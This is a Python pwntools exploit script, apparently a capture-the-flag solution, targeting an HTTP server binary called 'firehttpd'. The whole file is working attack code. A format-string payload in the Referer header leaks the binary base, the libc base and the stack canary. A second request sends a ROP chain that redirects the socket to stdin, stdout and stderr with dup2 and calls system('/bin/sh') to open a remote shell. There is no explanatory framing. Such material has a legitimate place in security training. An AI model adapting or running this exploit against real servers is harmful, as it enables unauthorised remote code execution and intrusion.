#!/usr/bin/env python3

import re
import sys
import random
from pwn import *

elf = ELF("./firehttpd")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# context.log_level = 'debug'

# leak stack address to write
r = remote("127.0.0.1", 1337)
# r = remote("142.93.113.55", 31084)

payload = "%9$p.%27$p.%268$p.%5$p"
request = (
    "GET / HTTP/1.0\r\n"
    "Referer: " + payload + "\r\n" +
    "\r\n"
)
r.send(request)
data = r.recvall()

res = re.findall(b"Referer: (0x[0-9a-f]+).(0x[0-9a-f]+).(0x[0-9a-f]+).(0x[0-9a-f]+)", data)

base_elf = int(res[0][0], 16) - 0x31ca
libc.address = int(res[0][1], 16) - 0x3e8360
canary = int(res[0][2], 16)
command_addr = int(res[0][3], 16) - 0x2a8 + 80 + 40 +8

print("ELF Base %x" % base_elf)
print("LIBC Base %x" % libc.address)
print("Canary %x" % canary)
print("Command addr %x" % command_addr)


# write to address
r = remote("127.0.0.1", 1337)
# r = remote("142.93.113.55", 31084)

nullbyte = b"%8$c"
payload = (
    b"%1023c" + 
    nullbyte + p64(canary)[1:] +
    b"A" * 8 +

    # dup2 stdin
    p64(libc.address + 0x2155f)[:-2] + nullbyte * 2 + # 0x000000000002155f : pop rdi ; ret
    p64(0x4)[:-7] + nullbyte * 7 +
    p64(libc.address + 0x1306da)[:-2] + nullbyte * 2 + # 0x00000000001306da : pop rsi ; ret
    p64(0x0)[:-8] + nullbyte * 8 +
    p64(libc.sym.dup2)[:-2] + nullbyte * 2 +

    # dup2 stdout
    p64(libc.address + 0x2155f)[:-2] + nullbyte * 2 + # 0x000000000002155f : pop rdi ; ret
    p64(0x4)[:-7] + nullbyte * 7 +
    p64(libc.address + 0x1306da)[:-2] + nullbyte * 2 + # 0x00000000001306da : pop rsi ; ret
    p64(0x1)[:-7] + nullbyte * 7 +
    p64(libc.sym.dup2)[:-2] + nullbyte * 2 +

    # dup2 stderr 
    p64(libc.address + 0x2155f)[:-2] + nullbyte * 2 + # 0x000000000002155f : pop rdi ; ret
    p64(0x4)[:-7] + nullbyte * 7 +
    p64(libc.address + 0x1306da)[:-2] + nullbyte * 2 + # 0x00000000001306da : pop rsi ; ret
    p64(0x3)[:-7] + nullbyte * 7 +
    p64(libc.sym.dup2)[:-2] + nullbyte * 2 +

    # just a ret to allign stack
    p64(libc.address + 0x21560)[:-2] + nullbyte * 2 + # 0x000000000002155f : pop rdi ; ret

    # system("/bin/sh")
    p64(base_elf + 0x25ab)[:-2] + nullbyte * 2 +  # 0x00000000000025ab : pop rdi ; ret 
    p64(command_addr)[:-2] + nullbyte * 2 +
    p64(base_elf + 0x25ac)[:-2] + nullbyte * 2 +
    p64(libc.sym.system)[:-2] + nullbyte * 2 +
    b"/bin/sh"
)

request = (
    b"GET / HTTP/1.0\r\n"
    b"Referer: " + payload + b"\r\n" +
    b"\r\n"
)
r.send(request)
r.interactive()
